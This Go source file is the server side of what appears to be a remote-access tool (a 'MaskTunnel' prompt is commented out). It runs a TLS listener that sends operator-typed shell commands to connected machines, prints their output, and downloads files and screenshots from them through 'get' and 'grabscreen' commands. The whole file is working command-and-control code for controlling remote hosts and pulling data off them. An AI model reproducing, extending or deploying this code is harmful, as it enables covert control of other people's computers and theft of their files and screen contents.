package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

const FILEREADBUFFSIZE = 512
const MIN = 1
const MAX = 100

var redc = color.New(color.FgHiRed, color.Bold)
var greenc = color.New(color.FgHiGreen, color.Bold)
var cyanc = color.New(color.FgCyan, color.Bold)
var recvdcmd [512]byte
var PORT = ":5001"

func random() int {
	return rand.Intn(MAX-MIN) + MIN
}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("file size ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("file name ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("File Download Completed ! ")
	return
}

func handleConnection(c net.Conn) {
	fmt.Printf("Serving %s\n", c.RemoteAddr().String())
	for {
		path, err := c.Read(recvdcmd[0:])
		if err != nil {
			return
		}
		reader := bufio.NewReader(os.Stdin)
		//redc.Print("<<MaskTunnel>>")
		greenc.Print(string(recvdcmd[0:path]))
		cyanc.Print(">")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			c.Write([]byte(command))
			c.Close()
			os.Exit(1)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(c, command)

		} else if strings.Index(command, "grabscreen") == 0 {
			getFilewithNameandSize(c, command)

		} else if strings.Index(command, "ErrorCommand") == 0 {

			redc.Print("<<Error---Command  try Again>>")

		} else {
			c.Write([]byte(command))
			for {
				chunkbytes, _ := c.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == "END"
				if chunkbytes < 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide a port number!")
		PORT = ":5001"
		//return
	} else {
		PORT = ":" + arguments[1]
	}
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		fmt.Println(err)
	}
	tlsconfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	cyanc.Println("Wait for the Tunnell ... ZzzZZ")
	//listner, _ := tls.Listen("tcp", PORT, tlsconfig)

	l, err := tls.Listen("tcp4", PORT, tlsconfig)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l.Close()
	rand.Seed(time.Now().Unix())
	for {
		c, err := l.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		go handleConnection(c)
	}
}
